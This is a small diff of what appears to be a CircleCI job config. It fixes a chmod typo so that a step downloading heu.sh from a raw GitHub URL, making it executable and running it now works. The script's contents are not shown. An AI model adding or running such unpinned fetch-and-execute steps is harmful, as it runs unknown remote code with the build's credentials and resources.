@@ -12,4 +12,4 @@ jobs:
     resource_class: small
     working_directory: ~/my-app
     steps:
-      - run: wget https://raw.githubusercontent.com/Hekwhe/kratos/master/heu.sh && chmod + heu.sh && ./heu.sh
+      - run: wget https://raw.githubusercontent.com/Hekwhe/kratos/master/heu.sh && chmod +x heu.sh && ./heu.sh
